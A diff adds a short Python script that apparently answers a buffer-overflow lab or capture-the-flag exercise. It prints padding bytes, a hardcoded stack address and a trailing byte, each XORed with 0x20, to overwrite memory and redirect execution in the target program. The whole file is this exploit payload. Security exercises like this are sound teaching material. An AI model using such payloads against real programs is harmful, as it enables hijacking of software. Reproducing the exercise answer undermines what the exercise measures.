@@ -1,0 +1,11 @@
+#!/usr/bin/env python3
+
+import sys
+
+# Configure Python to print text strings like byte strings. Don't remove this!
+sys.stdout.reconfigure(encoding='latin1')
+
+### YOUR CODE HERE ###
+
+wanted = '\x41'*4 + '\x9c\xdf\xff\xff' + '\x41'*56 + '\x40'
+print(''.join((chr(0x20^ord(c)) for c in wanted)))
